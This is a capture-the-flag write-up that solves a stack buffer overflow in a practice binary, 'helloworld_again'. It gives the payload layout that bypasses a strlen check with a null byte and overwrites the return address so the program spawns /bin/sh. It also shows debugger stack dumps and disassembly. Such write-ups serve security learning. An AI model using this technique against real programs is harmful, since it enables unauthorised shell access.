## Some Notes
1. The function helloworld is stored at 0x40125b.
2. rbp - 0x20 (32) is the address of the char s[32] and it's the argument passed to __isoc99_scanf().
3. If the return value of strlen(s) is larger than 32, then the process will exit with 0.
4. If the return value of strlen(s) is below or equal to 32, then if the input string isn't equal to "helloworld", then the process will exit with 0.
5. The solution of 3. & 4. is to input "helloworld\0" + (40 - 11) * 'a' + target address (0x401263).

### Some problems encountered
```
0x007ffeb307b2c0│+0x0000: "helloworld"   ← $rax, $rsp, $rdi
0x007ffeb307b2c8│+0x0008: 0x616161616100646c ("ld"?)
0x007ffeb307b2d0│+0x0010: 0x6161616161616161
0x007ffeb307b2d8│+0x0018: 0x6161616161616161
0x007ffeb307b2e0│+0x0020: 0x6161616161616161     ← $rbp
0x007ffeb307b2e8│+0x0028: 0x0000000040125b  →  <helloworld+0> endbr64 
0x007ffeb307b2f0│+0x0030: 0x007f07faf25600  →  0x007ffeb307b3d8  →  0x007ffeb307c3fa  →  "./helloworld_again"
0x007ffeb307b2f8│+0x0038: 0x007ffeb307b3d8  →  0x007ffeb307c3fa  →  "./helloworld_again"
```
Successfully store the address of helloworld in the return address ($rbp + 8)  
Therefore, /bin/sh is assumed to be executed.  
However, it will cause SIGSEGV.
```
[#0] Id 1, Name: "helloworld_agai", stopped 0x7f05d1e3ee3c in do_system (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f05d1e3ee3c → do_system(line=0x402008 "/bin/sh")
[#1] 0x40126f → helloworld()
[#2] 0x7f05d2024600 →  <_dl_argv+0> call 0x7f05d01d8c1b
[#3] 0x7ffe1b4616e8 → cli
```
***Solution: overflow the return address with 0x401263 instead of 0x40125b***  
Because the overflowed rbp may point to unavailable address or address in kernel address space, jump to 0x401263 directly is a better way to execute the shell.  
```
000000000040125b <helloworld>:
  40125b:	f3 0f 1e fa          	endbr64 
  40125f:	55                   	push   rbp
  401260:	48 89 e5             	mov    rbp,rsp
  401263:	48 8d 3d 9e 0d 00 00 	lea    rdi,[rip+0xd9e]        # 402008 <_IO_stdin_used+0x8>
  40126a:	e8 51 fe ff ff       	call   4010c0 <system@plt>
  40126f:	90                   	nop
  401270:	5d                   	pop    rbp
  401271:	c3                   	ret
```

**Solved**
